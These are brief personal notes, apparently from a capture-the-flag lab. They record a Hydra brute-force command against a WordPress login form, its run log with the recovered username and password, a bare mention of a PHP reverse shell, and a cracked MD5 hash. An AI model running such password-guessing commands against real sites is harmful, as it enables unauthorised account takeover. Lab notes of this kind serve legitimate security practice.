# Apuntes

hydra -l Elliot -P ./f.dic 10.10.115.72 http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username" -t 30
 
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[INFORMATION] reading restore file ./hydra.restore
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-10 02:05:01
[DATA] max 30 tasks per 1 server, overall 30 tasks, 11452 login tries (l:1/p:11452), ~382 tries per task
[DATA] attacking http-post-form://10.10.115.72:80/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username
[STATUS] 3376.00 tries/min, 3376 tries in 00:01h, 8076 to do in 00:03h, 30 active
[STATUS] 1739.50 tries/min, 3479 tries in 00:02h, 7973 to do in 00:05h, 30 active
[STATUS] 921.25 tries/min, 3685 tries in 00:04h, 7767 to do in 00:09h, 30 active
[STATUS] 510.75 tries/min, 4086 tries in 00:08h, 7366 to do in 00:15h, 30 active
[STATUS] 352.92 tries/min, 4588 tries in 00:13h, 6864 to do in 00:20h, 30 active
[STATUS] 282.00 tries/min, 5076 tries in 00:18h, 6376 to do in 00:23h, 30 active

^[[3~[80][http-post-form] host: 10.10.115.72   login: Elliot   password: ER28-0652


reverse shell php

hash

c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz